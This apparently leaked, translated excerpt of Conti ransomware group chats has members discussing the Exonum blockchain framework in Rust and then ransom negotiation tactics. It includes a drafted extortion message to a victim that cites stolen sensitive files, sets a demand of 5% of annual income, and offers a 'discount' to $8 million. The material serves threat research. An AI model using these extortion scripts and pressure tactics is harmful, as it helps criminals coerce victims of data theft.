Yesterday, Friday, waited for you late. )))
Today is Saturday. Here's the deal.
I had a closer look at Exonum.
Decided to give it a try. The bottom line is that it's just a blueprint
for the blockchain. You can write everything yourself.
And the structure of transactions and contracts.
The framework itself is written in Rust.
We write all our own stuff in Rust too.
The contracts, too, in Rust.
I'm not an expert in Rust yet, but despite my conservatism
in programming languages (I use nothing but C++), Rust
suddenly appealed to me. I'm already about a third of the way through the 600+ page tutorial.
Indeed, Rust is faster to develop than C++.
In general, if you believe the Exonum developers, you can pretty quickly roll up your
private blockchain. Their last edits to the git were on January 13, so they're accompanying it.
If you don't mind, I'll look into it next week, then I'll report back.
Give me your backup contact.
Don't knock the price tag so drastically.
From $2,000 to $100,000.
That's not normal.
You know they're bullshitting.
We've had situations where they told us they could pay 100k at the most.
We ended up paying 5k.

We are very upset that you don't believe in the fulfillment of our conditions. First of all, we appreciate and value our reputation (about us and on the fulfillment of our agreements you can find a lot of information in the Internet). This is the main thing. But you will understand this when we make the deal. The second one, we will explain you a little bit deeper about amount: The Conti has a big legal department and it checks all the possible data and sources to establish an appropriate amount. We check your annual income, the value of materials (you have a lot of SENSETIVE and PRIVATE files, Military bufget and so on), etc. Also, please don't forget about the decryption software and our expenses. Therefore, basing on all the info, we set a 5% amount for a payment. FYI, every our client is asked to pay this sum, you are not unique. But considering your situation we can give you very big disount - 20%. Now our price for you is $8kk.
I already fuckin' told them that.
Maybe add the second...
...so they know why it's so expensive and remind them about the date, it's a big fucking deal.
